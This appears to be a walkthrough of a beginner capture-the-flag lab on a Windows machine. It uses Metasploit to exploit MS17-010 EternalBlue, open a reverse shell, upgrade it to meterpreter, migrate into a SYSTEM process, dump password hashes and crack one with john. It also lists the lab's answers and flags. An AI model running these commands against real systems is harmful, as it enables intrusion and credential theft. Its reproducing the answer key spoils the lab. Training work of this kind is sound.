Deploy & hack into a Windows machine, leveraging common misconfigurations issues.

**Module 1: Recon**

Scan and learn what exploit this machine is vulnerable to. Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up. This room is not meant to be a boot2root CTF, rather, this is an educational series for complete beginners. Professionals will likely get very little out of this room beyond basic practice as the process here is meant to be beginner-focused.

**Module 2: Gain Access**

Exploit the machine and gain a foothold.


**Answer the questions below**

1. _Start [Metasploit_](https://tryhackme.com/module/metasploit)


Answer: No answer needed

**_Explanation:_**

type `msfconsole` on your terminal

<img width="917" height="272" alt="image" src="https://github.com/user-attachments/assets/4149f7ec-d36e-484f-ab7d-3d9f592fd17a" />

2. _Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)_

Answer: `exploit/windows/smb/ms17_010_eternalblue`

**_Explanation:_**

We now use  `search ms17-010` and  we see an exploit `exploit/windows/smb/ms17_010_eternalblue`

<img width="910" height="437" alt="image" src="https://github.com/user-attachments/assets/509769a8-37da-448c-a562-027dff51c579" />

3. _Show options and set the one required value. What is the name of this value? (All caps for submission)_

Answer: `RHOSTS`

**_Explanation:_**

We use `use 0` and then we use `show options` and then we need to set "RHOSTS"

<img width="921" height="990" alt="image" src="https://github.com/user-attachments/assets/3a10fa2c-1c77-4d2e-98ca-5ff2275f0ebd" />

and now we set the rhosts 

<img width="913" height="127" alt="image" src="https://github.com/user-attachments/assets/8847e976-793f-4e77-9c4d-231c85a84f5a" />

4. Usually it would be fine to run this exploit as is; however, for the sake of learning, you should do one more thing before exploiting the target. Enter the following command and press enter:

`set payload windows/x64/shell/reverse_tcp`

With that done, run the exploit!

Answer: No answer needed 

**_Explanation:_**

We use the command given in the question and then run `exploit`

<img width="894" height="165" alt="image" src="https://github.com/user-attachments/assets/b773d5c2-db6b-410a-9ff7-d0a7d94c8f78" />

5. _Confirm that the exploit has run correctly. You may have to press enter for the DOS shell to appear. Background this shell (CTRL + Z). If this failed, you may have to reboot the target VM. Try running it again before a reboot of the target._

Answer: No answer needed 

**_Explanation:_**

When we run exploit we should get a shell session opened

<img width="905" height="443" alt="image" src="https://github.com/user-attachments/assets/7f26abc7-b6c7-4ec3-869d-b31164023378" />

--------------------------------------------------------------------------------------------------------------------------------------------

**Module 3: Escalate**

Escalate privileges, learn how to upgrade shells in metasploit.

**Answer the questions below**

1. _If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected)_

Answer: `post/multi/manage/shell_to_meterpreter` 

**_Explanation:_**

We will use Ctrl+Z and we use `search shell_to_meterpreter` and use 0 

<img width="913" height="548" alt="image" src="https://github.com/user-attachments/assets/b05c2fdc-f6b0-45a6-9b1c-607d75ade764" />

2. _Select this (use MODULE_PATH). Show options, what option are we required to change?_

Answer: `SESSION`

**_Explanation:_**

We use `show options` 

<img width="910" height="597" alt="image" src="https://github.com/user-attachments/assets/18d3f478-0bca-4917-8074-08af4d6020a8" />

3. _Set the required option, you may need to list all of the sessions to find your target here._

Answer: No answer needed

**_Explanation:_**

We use sessions -l and set session 1

4. _Run! If this doesn't work, try completing the exploit from the previous task once more._

Answer: No answer needed

**_Explanation:_**

We hit run and we then we see new session opened

<img width="917" height="364" alt="image" src="https://github.com/user-attachments/assets/f110d6d0-8519-423c-9087-6d45a3716723" />

5. _Once the meterpreter shell conversion completes, select that session for use._

Answer: No answer needed

**_Explanation:_**

We use `sessions -i <session-number>` and we get meterpreter

<img width="917" height="364" alt="image" src="https://github.com/user-attachments/assets/f110d6d0-8519-423c-9087-6d45a3716723" />

6. _Verify that we have escalated to NT AUTHORITY\SYSTEM. Run getsystem to confirm this. Feel free to open a dos shell via the command 'shell' and run 'whoami'. This should return that we are indeed system. Background this shell afterwards and select our meterpreter session for usage again._

Answer: No answer needed

**_Explanation:_**

We use `shell` and then `whoami` and we see `NT AUTHORITY\SYSTEM`

<img width="913" height="312" alt="image" src="https://github.com/user-attachments/assets/7317183c-c886-4a9e-b06b-1643b431fd0b" />


7. _List all of the processes running via the 'ps' command. Just because we are system doesn't mean our process is. Find a process towards the bottom of this list that is running at NT AUTHORITY\SYSTEM and write down the process id (far left column)._

Answer: No answer needed

**_Explanation:_**

We use exit and then type ps and scrolling down we see many processes running at `NT AUTHORITY\SYSTEM` and we save pid of more than one processes 

<img width="912" height="987" alt="image" src="https://github.com/user-attachments/assets/db0a8195-b917-4ebc-b14f-3018276881ac" />


8. _Migrate to this process using the 'migrate PROCESS_ID' command where the process id is the one you just wrote down in the previous step. This may take several attempts, migrating processes is not very stable. If this fails, you may need to re-run the conversion process or reboot the machine and start once again. If this happens, try a different process next time._

Answer: No answer needed

**_Explanation:_**

We try with many PIDs `3048`, `3016` and `2856` and we see success finally

<img width="920" height="321" alt="image" src="https://github.com/user-attachments/assets/986a295f-613b-4adc-81b6-0116fe1f85d9" />

------------------------------------------------------------------------------------------------------------------------------------------------

**Module 4: Cracking**

Dump the non-default user's password and crack it!

**Answer the questions below**

1. _Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user?_

Answer: `Jon`

**_Explanation:_**

We use `hashdump` and then see the user "Jon" as non-default user

<img width="907" height="269" alt="image" src="https://github.com/user-attachments/assets/0f2e5cca-1156-4212-8ac1-61f4154e02b3" />


2. _Copy this password hash to a file and research how to crack it. What is the cracked password?_

Answer: `alqfna22`

**_Explanation:_**

We copy the hash inside a file 

<img width="920" height="289" alt="image" src="https://github.com/user-attachments/assets/ce591679-aa83-4d40-8317-2537f4e573f4" />

And now we crack it using `john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hash.txt` and then we can see the password

<img width="914" height="314" alt="image" src="https://github.com/user-attachments/assets/072ced36-b5f7-43b8-8a6a-56509d74e411" />

You can check out the third box in this series, Blaster, here: [Link](https://tryhackme.com/room/blaster)

**Answer the questions below**

1. _Flag1? This flag can be found at the system root._

Answer: `flag{access_the_machine}`

**_Explanation:_**

We see the current directory and then go back two folders up 

<img width="383" height="222" alt="image" src="https://github.com/user-attachments/assets/3f8d9b12-05e2-4e39-859d-7ff953fb6bb2" />

now we will use  `ls` and see flag1.txt

<img width="911" height="870" alt="image" src="https://github.com/user-attachments/assets/879b9e3f-c5eb-47bf-b23a-de530bf0832c" />

2. _Flag2? This flag can be found at the location where passwords are stored within Windows._

*Errata: Windows really doesn't like the location of this flag and can occasionally delete it. It may be necessary in some cases to terminate/restart the machine and rerun the exploit to find this flag. This relatively rare, however, it can happen. 

Answer: `flag{sam_database_elevated_access}`

**_Explanation:_**

We use `search -f flag2.txt` and find the path for the file2

And we now read the file

<img width="913" height="295" alt="image" src="https://github.com/user-attachments/assets/67a4f922-efb1-4887-b544-be00fe616172" />


3. _flag3? This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved._

Answer: `flag{admin_documents_can_be_valuable}`

**_Explanation:_**

We use `search -f flag3.txt` and then get the flag

<img width="916" height="310" alt="image" src="https://github.com/user-attachments/assets/6b90b67d-ba22-41b7-a963-caa26ab81e7c" />
